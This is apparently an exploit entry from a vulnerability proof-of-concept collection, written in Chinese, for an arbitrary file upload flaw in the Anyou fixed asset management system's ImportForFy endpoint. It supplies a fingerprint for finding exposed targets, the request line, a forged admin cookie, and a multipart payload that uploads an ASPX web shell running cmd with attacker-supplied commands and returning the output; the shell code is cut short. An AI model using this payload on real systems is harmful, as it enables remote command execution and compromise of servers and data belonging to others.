# 安友固定资产管理系统ImportForFy存在任意文件上传漏洞

- **系统**：安友固定资产管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="style/v2/layuiadmin/lib/"`
- **请求**：`POST /Ams/Asset/ImportForFy HTTP/1.1`
- **关键头**：`Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary`

**请求体 / payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="NewFile"; filename="qazwe.aspx"
Content-Type: image/jpeg
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File…（脚本共 776 字，完整版见原文）
```
- **预期**：200　|　—